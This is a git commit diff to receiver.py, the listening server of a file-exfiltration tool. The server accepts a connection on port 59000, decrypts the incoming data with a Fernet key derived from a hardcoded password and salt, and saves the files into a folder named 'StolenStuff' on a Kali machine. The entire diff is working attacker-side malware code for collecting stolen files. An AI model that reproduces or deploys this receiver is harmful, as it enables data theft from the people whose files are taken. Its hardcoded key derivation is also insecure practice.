f9b0fb0269f2210c557b55f190bd941270c61935
Jarrett-Austin <47702031+Jarrett-Austin@users.noreply.github.com>
2020-05-03 11:42:37 -0400

    Update receiver.py
    added decryption to receiver, requires cryptography package

--- receiver.py
+++ receiver.py
@@ -1,18 +1,37 @@
 import os
 import sys
 import socket
+#from Crypto.Cipher import AES
+import base64
+import os
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+from cryptography.fernet import Fernet
+
+password_provided = "Covid19" # This is input in the form of a string
+password = password_provided.encode() # Convert to type bytes
+salt = b'Bwahaha'
+kdf = PBKDF2HMAC(
+    algorithm=hashes.SHA256(),
+    length=32,
+    salt=salt,
+    iterations=100000,
+    backend=default_backend()
+)
+key = base64.urlsafe_b64encode(kdf.derive(password))
 
 if __name__ == "__main__":
     try:
         # create a socket
         socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        socket_connection.bind(("10.0.0.196", 59000))
+        socket_connection.bind(('', 59000))
 
         # listen for a client
-        socket_connection.listen()
+        socket_connection.listen(5)
         client_request, r = socket_connection.accept()
 
-        os.chdir('/home/kali/Desktop/files/')# put path of the directory you want the files to go)
+        os.chdir('/home/kali/Documents/StolenStuff/')# put path of the directory you want the files to go
 
         # naming title
         count = 1
@@ -24,10 +43,12 @@ if __name__ == "__main__":
         # Cut out the end bytes
         data = data[:len(data)-9]
         
-        # TODO: Unencrypt "data" here
+        # Unencrypt "data" here
+        f = Fernet(key)
+        unencrypted_data = f.decrypt(data)
         
         # Split the data by file
-        datalist = data.split(b'\x00\x01\x02BEGIN\x00\x01\x02')
+        datalist = unencrypted_data.split(b'\x00\x01\x02BEGIN\x00\x01\x02')
         datalist.pop(0)
 
         for filedata in datalist:
